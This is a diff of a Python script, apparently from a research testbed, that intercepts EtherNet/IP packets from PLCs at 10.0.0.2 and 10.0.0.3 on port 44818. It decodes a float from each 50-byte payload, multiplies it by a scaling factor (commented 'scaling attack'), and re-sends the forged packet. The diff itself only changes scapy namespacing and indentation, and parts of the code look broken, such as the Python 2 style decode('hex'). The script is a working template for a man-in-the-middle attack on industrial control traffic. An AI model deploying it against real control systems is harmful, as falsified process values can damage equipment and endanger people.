@@ -26,10 +26,10 @@ else:
 print(scaling_factor)
 
 def modify(packet):
-    pkt = IP(packet.get_payload())
+    pkt = scapy.IP(packet.get_payload())
     
     if (sys.argv[1] == 'PLC3'):
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.3":
+        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[scapy.IP].src =="10.0.0.3":
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
@@ -39,12 +39,12 @@ def modify(packet):
                 scaled = (1+scaling_factor)*val
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
-                del pkt[IP].chksum
-                del pkt[TCP].chksum
+                del pkt[scapy.IP].chksum
+                del pkt[scapy.TCP].chksum
         packet.drop()
         send(pkt)
     elif (sys.argv[1] == 'PLC2'):
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.2":
+        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[scapy.IP].src =="10.0.0.2":
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
@@ -54,23 +54,23 @@ def modify(packet):
                 scaled = (1+scaling_factor)*val
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
-                del pkt[IP].chksum
-                del pkt[TCP].chksum
+                del pkt[scapy.IP].chksum
+                del pkt[scapy.TCP].chksum
         packet.drop()
         send(pkt)
     elif (sys.argv[1] == 'BOTH'):
-        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 :
-            if pkt[IP].src =="10.0.0.2"  or pkt[IP].src =="10.0.0.3":
+        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 :
+            if pkt[scapy.IP].src =="10.0.0.2"  or pkt[scapy.IP].src =="10.0.0.3":
                 if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
-                	mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
-                	payload = mydata[-8:]
-                	val = struct.unpack("<f", binascii.unhexlify(payload))[0]
+                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                    payload = mydata[-8:]
+                    val = struct.unpack("<f", binascii.unhexlify(payload))[0]
                 	#scaling attack
-                	scaled = (1+scaling_factor)*val
-                	newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
-                	pkt[Raw].load = newdata.decode('hex')
-                	del pkt[IP].chksum
-                	del pkt[TCP].chksum
+                    scaled = (1+scaling_factor)*val
+                    newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
+                    pkt[Raw].load = newdata.decode('hex')
+                    del pkt[scapy.IP].chksum
+                    del pkt[scapy.TCP].chksum
             packet.drop()
             send(pkt)
 
